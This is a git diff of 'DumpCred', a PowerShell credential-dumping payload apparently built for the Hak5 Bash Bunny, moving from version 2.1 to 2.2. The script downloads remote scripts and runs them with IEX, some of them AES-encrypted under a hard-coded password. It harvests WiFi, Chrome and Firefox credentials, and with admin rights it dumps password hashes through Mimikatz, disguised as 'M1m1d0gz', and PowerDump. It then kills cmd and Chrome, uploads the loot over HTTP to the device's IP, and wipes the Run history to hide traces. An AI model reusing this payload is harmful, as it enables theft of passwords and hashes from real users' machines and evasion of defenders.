@@ -1,7 +1,7 @@
 ﻿
 <#
 .SYNOPSIS
-   DumpCred 2.1
+   DumpCred 2.2
 .DESCRIPTION
    Dumps all Creds from a PC 
 .PARAMETER <paramName>
@@ -10,102 +10,136 @@
    DumpCred
 #>
 
-$_Version = "2.1.0"
-$_BUILD = "1004"
-
-# Share on bashbunny
-$SHARE="\\172.16.64.1\e"
-$LOOT="$SHARE\loot"
 
 
-$FILE="$LOOT\$env:COMPUTERNAME.txt"
+$_Version = "2.2.0"
+$_BUILD = "1008"
+
+# Encoded File Info
+$HTTP_Server="172.16.64.1"
+$Password="hak5bunny"
+$date = date
+
+# other vars
+$FILE="$env:COMPUTERNAME.txt"
 $TMPFILE=[System.IO.Path]::GetTempFileName()
 $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
 $LINE3="`n`n`n"
+$OFS = "`n"
 
-# Wait for Share
-do { 
-    Start-Sleep -s 1
-    Write-Host -NoNewline "-"
-} until (test-path \\172.16.64.1\e)
+######################### Some functions ########################
 
-# Ok we got the connection.... Wait and Initiate the Handshake
-# Handshake - create CON_REQ on Share. Bunny creates CON_OK if all is OK --- Check Share is writable
-while ( -Not (Test-Path "$SHARE\CON_OK")) {
-    Start-Sleep -s 1
-    Write-Host -NoNewline "."
-    if ( -Not (( Test-Path "$SHARE\CON_REQ") -or (Test-Path "$SHARE\CON_OK"))) { 
-        Write-output " " | out-file "$SHARE\CON_REQ"
-        Write-Host -NoNewline "+"
+$runFunc = {function Run {
+    param ([String]$PSFile, [String]$Password="hak5bunny", [String]$Server="172.16.64.1", [Switch]$isEncrypted)
+
+        $WebClient = New-Object net.WebClient
+        $WebClient.Encoding =[System.Text.Encoding]::UTF8
+        
+        if ( $isEncrypted ) {
+            
+            $WebClient.Encoding =[System.Text.Encoding]::Unicode
+            $InputString = ($WebClient.DownloadString('http://' + $Server + '/PS/' + $PSFile + '.enc')).trim()
+
+
+		    # Decrypt with custom algo
+		    $InputData = [Convert]::FromBase64String($InputString)
+		
+		    $Salt = New-Object Byte[](32)
+		    [Array]::Copy($InputData, 0, $Salt, 0, 32)
+		    $Rfc2898 = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($Password,$Salt)
+		    $AESKey = $Rfc2898.GetBytes(32)
+		    $AESIV = $Rfc2898.GetBytes(16)
+		    $Hmac = New-Object System.Security.Cryptography.HMACSHA1(,$Rfc2898.GetBytes(20))
+		
+		    $AuthCode = $Hmac.ComputeHash($InputData, 52, $InputData.Length - 52)
+		
+		    if (Compare-Object $AuthCode ($InputData[32..51]) -SyncWindow 0) {
+			    throw 'Checksum failure.'
+		    }
+		    
+		    $AES = New-Object Security.Cryptography.RijndaelManaged
+		    $AESDecryptor = $AES.CreateDecryptor($AESKey, $AESIV)
+		
+		    $DecryptedInputData = $AESDecryptor.TransformFinalBlock($InputData, 52, $InputData.Length - 52)
+		
+		    $DataStream = New-Object System.IO.MemoryStream($DecryptedInputData, $false)
+		    if ($DecryptedInputData[0] -eq 0x1f) {
+			    $DataStream = New-Object System.IO.Compression.GZipStream($DataStream, [IO.Compression.CompressionMode]::Decompress)
+		    }
+		
+		    $StreamReader = New-Object System.IO.StreamReader($DataStream, $true)
+		    iex ([System.Text.Encoding]::unicode.GetString([System.Convert]::FromBase64String($StreamReader.ReadToEnd())))
+        } else {
+            IEX $WebClient.DownloadString('http://' + $Server + '/PS/' + $PSFile + '.ps1')
+        }
     }
 }
-Write-Host "!"
 
-# Go on......
+#######################################################################
 
-# For Outpu we are useing a local TMP File because OUT-File -append to a Fil on Share does not work :-(
-# Remove TMP File
+# Kill all cmd's and Chrome
+taskkill /F /IM cmd.exe
+taskkill /F /IM chrome.exe
 
-Remove-Item $TMPFILE -ErrorAction SilentlyContinue
-
-# Set Output buffer width to 500
-# Update output buffer size to prevent clipping in Visual Studio output window.
-if( $Host -and $Host.UI -and $Host.UI.RawUI ) {
-  $rawUI = $Host.UI.RawUI
-  $oldSize = $rawUI.BufferSize
-  $typeName = $oldSize.GetType( ).FullName
-  $newSize = New-Object $typeName (500, $oldSize.Height)
-  $rawUI.BufferSize = $newSize
-}
-
-
-"###DumpCreds " + $_VERSION + " Build " + $_BUILD + "     Admin Mode: " + $isAdmin| OUT-File $TMPFILE
-"=======================================================" | OUT-File -append $TMPFILE
-$LINE3 | Add-Content $TMPFILE
-
-
-# Start all Scripts in $SHARE\PS as job
-
-# First remove all jobs  I'm so bad....., don't care about running jobs
+# First remove all jobs  I'm so bad....., don't care about running jobs top all, remove all
 Stop-Job *
 Remove-Job *
 
-Write-Host "Wifi-Cred" ; start-job -ArgumentList $SHARE {Param($SHARE); powershell -WindowStyle Hidden -Exec Bypass $SHARE\PS\Get-WiFiCreds.ps1} -ErrorAction SilentlyContinue | Out-Null
-Write-Host "ChromeCred" ;  start-job -ArgumentList $SHARE {Param($SHARE); powershell -WindowStyle Hidden -Exec Bypass $SHARE\PS\Get-ChromeCreds.ps1} -ErrorAction SilentlyContinue | Out-Null
-Write-Host "IECred" ; start-job -ArgumentList $SHARE {Param($SHARE); powershell -WindowStyle Hidden -Exec Bypass $SHARE\PS\Get-IECreds.ps1} -ErrorAction SilentlyContinue | Out-Null
-Write-Host "FireFoxCred" ; start-job -RunAs32 -ArgumentList $SHARE {param($SHARE); powershell -WindowStyle Hidden -Exec Bypass $SHARE\PS\Get-FoxDump.ps1} -ErrorAction SilentlyContinue | Out-Null
-Write-Host "Inventory" ; start-job -ArgumentList $SHARE {Param($SHARE); powershell -WindowStyle Hidden -Exec Bypass $SHARE\PS\Get-Inventory.ps1} -ErrorAction SilentlyContinue | Out-Null
+############# Start collect data
+
+
+
+
+$header = "#DumpCreds " + $_VERSION + " Build " + $_BUILD + "`n"
+$header = $header + "=======================================================`n"
+$header = $header + "Admin Mode: `t $isAdmin`n"
+$header = $header + "Date: `t`t`t $date`n"
+$header = $header + "Computername: `t $env:COMPUTERNAME `n" 
+$header = $header + "=======================================================`n"
+$header = $header + " "
+$header = $header + $LINE3
+
+
+
+
+# Start all Scripts as job
+Write-Host "Run Scripts..."
+
+$runBlock = {Param($File, $Server) Run -PSFile $File -Server $Server}
+$runBlockEnc = {Param($File,$Pass, $Server) Run -PSFile $File -Password $Pass -Server $Server -isEncrypted}
+
+
+Write-Host "`t Get-WifiCreds";
+Start-Job -ScriptBlock $runBlock -InitializationScript $runFunc -ArgumentList ("Get-WiFiCreds", $HTTP_SERVER) | out-null
+Write-Host "`t Get-ChromeCreds"
+Start-Job -ScriptBlock $runBlock -InitializationScript $runFunc -ArgumentList ("Get-ChromeCreds", $HTTP_SERVER) | out-null
+#Write-Host "`t Get-IECreds"
+#Start-Job -ScriptBlock $runBlock -InitializationScript $runFunc -ArgumentList ("Get-IECreds", $HTTP_SERVER) | out-null
+Write-Host "`t Get-FoxDump" 
+Start-Job -ScriptBlock $runBlock -InitializationScript $runFunc -ArgumentList ("Get-FoxDump", $HTTP_SERVER) -RunAs32 | out-null
+Write-Host "`t Get-Inventory" 
+Start-Job -ScriptBlock $runBlock -InitializationScript $runFunc -ArgumentList ("Get-Inventory", $HTTP_Server) | out-null
 if ($isAdmin) {
-    Write-Host "Hashes" ; start-job -ArgumentList $SHARE {Param($SHARE); powershell -WindowStyle Hidden -Exec Bypass $SHARE\PS\Invoke-PowerDump.ps1} -ErrorAction SilentlyContinue | Out-Null
-    Write-Host "M1m1k@tz" ; start-job -ArgumentList $SHARE {Param($SHARE); powershell -WindowStyle Hidden -Exec Bypass $SHARE\PS\invoke-m1m1d0gz.ps1} -ErrorAction SilentlyContinue | Out-Null
+    Write-Host "`t Get-M1m1d0gz" 
+    Start-Job -ScriptBlock $runBlockEnc -InitializationScript $runFunc -ArgumentList ("Invoke-M1m1d0gz",$Password, $HTTP_SERVER) | out-null
+    Write-Host "`t Get-PowerDump" 
+    Start-Job -ScriptBlock $runBlock -InitializationScript $runFunc -ArgumentList ("Invoke-PowerDump", $HTTP_SERVER) | out-null
 }
-Write-host "... Wait for end of jobs"
+
 # Wait for all jobs
-Get-Job | Wait-Job
+Write-Host "Waiting for finishing Jobs"
+Get-Job | Wait-Job |out-null
 
-Write-host "... Receiving results"
+Write-host "Receiving results"
 # Receive all results
-Get-Job | Receive-Job | Out-File -Append $TMPFILE
+$Result = Get-Job | Receive-Job
+$OUT = $header + $Result
+$OUT = $out.Replace([char][int]10, "`n")
 
 
+# Upload Result to bunny's loot dir
+(New-Object Net.WebClient).UploadString('http://' + $HTTP_Server +'/' + $env:COMPUTERNAME, $OUT)
+(New-Object Net.WebClient).UploadString('http://' + $HTTP_Server + '/EOF', 'EOF');
 
-
-#Move TMP File to Bunny
-Write-host "Moving file to bunny"
-move-item $TMPFILE -Destination $FILE -Force -ErrorAction SilentlyContinue
-
-# Cleanup
-# Remove Run History
-Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue
-
-Write-host "... Rename CON_OK to CON_EOF"
-# Rename CON_OK to CON_EOF so bunny knows that all the stuff has finished
-Rename-Item -Path "$SHARE\CON_OK" -NewName "$SHARE\CON_EOF"
-
-Write-host "... Kill cmds"
-# Kill cmde.exe 
-Stop-Process -name cmd -ErrorAction SilentlyContinue
-
-Write-host "... Remove all Jobs"
-# Remove all Jobs from Joblist
-Remove-Job *
+#  Epmty Run Input Field
+Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentContinue
